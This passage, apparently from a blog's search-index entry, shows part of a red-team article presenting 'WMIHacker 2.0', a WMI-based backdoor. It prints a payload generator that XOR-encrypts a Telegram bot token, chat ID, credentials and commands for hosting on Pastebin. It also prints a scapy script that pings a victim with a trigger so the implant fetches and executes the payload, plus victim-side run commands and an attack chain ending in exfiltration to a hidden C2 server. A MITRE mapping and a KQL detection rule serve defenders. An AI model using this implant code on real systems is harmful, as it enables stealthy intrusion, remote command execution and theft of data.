C:\\\\Users\\\\Administrator\\\\hello.txt\u0026#34; msg = f\u0026#34;{TOKEN}$$$${CHAT_ID}$$$${IP_ADDR}$$$${USER}$$$${PASSWORD}$$$${COMMAND}\u0026#34;.encode() enc = xorshift_encrypt(msg, KEY) print(enc.hex()) This code (payload_gen.py) is designed to generate an encrypted payload that contains all the necessary parameters for the backdoor to operate. The payload will be uploaded to Pastebin, and the implant (on the victim machine) will later fetch, decrypt, and execute it on remote host. Parameters are separated by $$$$ and scraped on the victim host. Also, no artifacts such as BOT TOKEN or CHAT ID will be placed inside the code. It hardens the OPSEC, and may maintain the fewer artifacts on OS.\nfrom scapy.all import * victim_ip = input(\u0026#34;Enter the victim\u0026#39;s IP address: \u0026#34;).strip() id = input(\u0026#34;Enter the Pastebin ID: \u0026#34;).strip() packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f\u0026#34;PWN:{id}\u0026#34;) packet.show() send(packet) print(\u0026#34;Packet sent!\u0026#34;) This script (checker.py) sends a specially crafted ICMP Echo Request (ping) packet to a victim machine. The payload of the ICMP packet contains an identifier called PWN (Pastebin ID) that tells the backdoor on the victim side where to fetch the encrypted payload.\nAbove you can see the Proof of Concept implementation of the WMI-based backdoor.\nOn victims host:\nPS\u0026gt; python wmihacker.py \u0026lt;LOCAL IP\u0026gt; or\nPS\u0026gt; wmihacker.exe \u0026lt;LOCAL_IP\u0026gt; # build with PyInstaller I deployed whole project here: https://github.com/s0ld13rr/WMIHACKER\nThe attack chain might look this way:\nInitial access on a client machine via spear-phishing (T1566.001).\nThat machine sends a specially crafted packet to an internal Exchange server (already compromised).\nThe Exchange server, running a WMI backdoor, executes commands on other machines (T1047).\nCollected data is sent to a completely separate, hidden C2 server.\nAs I wrote in previous section, the WMIHACKER 2.0 use the asymmteric C2 approach for more stealthier lateral movement and execution. This is just a Proof-of-Concept tool and has several issues in OPSEC and Persistence.\nMITRE ATT\u0026amp;CK mapping The table below maps key attacker actions to MITRE ATT\u0026amp;CK techniques. It shows how the backdoor achieves things like initial access, execution, C2, and evasion—using WMI, ICMP, Telegram, and more. This gives a clear view of the TTPs involved and helps defenders understand what to watch for.\nTechnique ID Description Spearphishing Attachment T1566.001 Initial access via email with malicious attachment Windows Management Instrumentation (WMI) T1047 Remote command execution using WMI Command and Scripting Interpreter: Python T1059.006 Use of Python for execution Ingress Tool Transfer T1105 Downloading payloads (e.g., from Pastebin) Non-Application Layer Protocol T1095 C2 communication via non-standard protocols (e.g., ICMP) Exfiltration Over Web Service T1567.002 Exfiltration using Telegram Bot API Obfuscated Files or Information T1027 XOR encryption for payload confidentiality Proxy T1090 Asymmetric C2 using pivoting through internal nodes Detection \u0026amp; Response Continuous monitoring of infrastructure is the most effective approach to threat detection. To enhance security, it\u0026rsquo;s essential to regularly update detection rules and strengthen the infrastructure, thereby raising the cost of compromise.\nTo detect potential abuse of WMI in the context of WMIHacker-like activity, the following KQL (Kusto Query Language) detection rule can be used:\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe and event.code: 4688 and winlog.event_data.SubjectUserSid: \u0026quot;S-1-5-20\u0026quot;\nExplanation:\nevent.code: 4688 – Triggers on the creation of a new process.\nwinlog.event_data.ParentProcessName: *WmiPrvse.exe – Filters for processes spawned by the WmiPrvSE.exe process, which is commonly used during WMI execution.\nSubjectUserSid: \u0026ldquo;S-1-5-20\u0026rdquo; – Filters for the NETWORK SERVICE account, under which WMI may execute in certain contexts.\nResponse Actions:\nInvestigate the child process and command-line arguments.\nReview associated WMI event logs and consumer/subscription configurations.\nCorrelate with other telemetry such as network connections or abnormal service creation.\nApply endpoint detection \u0026amp; response (EDR) rules to block known malicious behaviors.\nConclusion WMI-based backdoors represent one of the stealthiest and most effective methods for post-exploitation in Windows environments. Leveraging native Windows components and protocols, WMI agents can perform lateral movement, execute commands, and retrieve system data without dropping binaries or creating noticeable artifacts.\nWhen integrated into an Asymmetric C2 architecture, these agents become even harder to detect and attribute, as they can operate via proxy nodes and relay chains deep within segmented networks.\n","permalink":"http://localhost:1313/posts/wmihacker-2.0/","summary":"\u003cblockquote\u003e\n\u003cp\u003eDISCLAIMER:\nThis article is intended strictly for educational and research purposes. The techniques, tools, and concepts discussed here are designed to enhance understanding of adversary tactics, improve defensive capabilities, and support authorized Red Team assessments. Any unauthorized or malicious use of the information provided is strongly condemned and may be illegal.\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"table-of-contents\"\u003eTable of Contents\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#introduction\"\u003eIntroduction\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#earth-kurma-chain\"\u003eEarth Kurma Chain\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#symmetric--asymmetric-approach-in-c2-infra\"\u003eSymmetric \u0026amp; Asymmetric approach in C2 infra\u003c/a\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"#symmetric-c2\"\u003eSymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#asymmetric-c2\"\u003eAsymmetric C2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#wmihacker-20\"\u003eWMIHacker 2.0\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#mitre-attck-mapping\"\u003eMITRE ATT\u0026amp;CK mapping\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#detection--response\"\u003eDetection \u0026amp; Response\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"#conclusion\"\u003eConclusion\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIn this article, I will present a reimagined version of the WMIHacker tool, which has been observed in APT campaigns attributed to the EARTH KURMA group. The revamped version focuses on advanced command and control (C2) techniques and demonstrates how both symmetric and asymmetric C2 infrastructures can be leveraged in real-world attack scenarios.\u003c/p\u003e","title":"WMIHacker 2.0 👾"}]